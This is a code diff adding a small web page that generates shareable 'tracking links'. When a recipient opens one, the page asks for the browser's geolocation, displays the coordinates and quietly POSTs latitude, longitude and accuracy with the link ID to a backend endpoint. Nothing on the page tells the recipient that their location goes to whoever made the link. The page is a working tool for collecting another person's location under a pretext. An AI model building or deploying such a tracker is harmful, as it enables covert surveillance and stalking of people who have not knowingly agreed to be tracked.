@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Location Tracker</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 2rem;
+      text-align: center;
+    }
+    input {
+      width: 100%;
+      max-width: 400px;
+      padding: 0.5rem;
+    }
+    button {
+      padding: 0.5rem 1rem;
+      margin-top: 1rem;
+    }
+    .info {
+      margin-top: 2rem;
+    }
+  </style>
+</head>
+<body>
+  <h1>Location Tracker Link Generator</h1>
+  <p>Click the button to generate a tracking link.</p>
+  <div id="app"></div>
+
+  <script>
+    function generateId() {
+      return Math.random().toString(16).slice(2, 10);
+    }
+
+    function buildShareLink(id) {
+      return window.location.origin + window.location.pathname + '?id=' + encodeURIComponent(id);
+    }
+
+    function renderMainPage() {
+      const app = document.getElementById('app');
+      app.innerHTML = '';
+      const btn = document.createElement('button');
+      btn.textContent = 'Generate Link';
+      btn.onclick = () => {
+        const id = generateId();
+        const link = buildShareLink(id);
+        renderLink(link);
+      };
+      app.appendChild(btn);
+    }
+
+    function renderLink(link) {
+      const app = document.getElementById('app');
+      app.innerHTML = \`
+        <p>Copy and share this link:</p>
+        <input readonly id="linkBox" value="\${link}" />
+        <br/>
+        <button onclick="copyLink()">Copy Link</button>
+        <p><a href="\${link}" target="_blank">Open Link</a></p>
+      \`;
+    }
+
+    function copyLink() {
+      const input = document.getElementById('linkBox');
+      input.select();
+      document.execCommand('copy');
+      alert('Link copied to clipboard!');
+    }
+
+    function renderLocationPage(id) {
+      const app = document.getElementById('app');
+      app.innerHTML = '<p>Trying to get your location...</p>';
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const lat = position.coords.latitude.toFixed(6);
+            const lon = position.coords.longitude.toFixed(6);
+            const acc = position.coords.accuracy.toFixed(2);
+            const info = document.createElement('div');
+            info.className = 'info';
+            info.innerHTML = \`
+              <p><strong>Latitude:</strong> \${lat}</p>
+              <p><strong>Longitude:</strong> \${lon}</p>
+              <p><strong>Accuracy:</strong> \${acc} meters</p>
+              <p><a href="https://maps.google.com/?q=\${lat},\${lon}" target="_blank">View on Google Maps</a></p>
+            \`;
+            app.innerHTML = '';
+            app.appendChild(info);
+
+            // Send location to backend
+            fetch('/api/submit-location', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ id: id, latitude: lat, longitude: lon, accuracy: acc })
+            }).then(res => res.json()).then(data => {
+              console.log('Location sent:', data);
+            }).catch(err => {
+              console.error('Error sending location:', err);
+            });
+          },
+          (error) => {
+            app.innerHTML = '<p>Location access denied or unavailable.</p>';
+          }
+        );
+      } else {
+        app.innerHTML = '<p>Geolocation not supported.</p>';
+      }
+    }
+
+    const params = new URLSearchParams(window.location.search);
+    const id = params.get('id');
+    if (id) {
+      renderLocationPage(id);
+    } else {
+      renderMainPage();
+    }
+  </script>
+</body>
+</html>
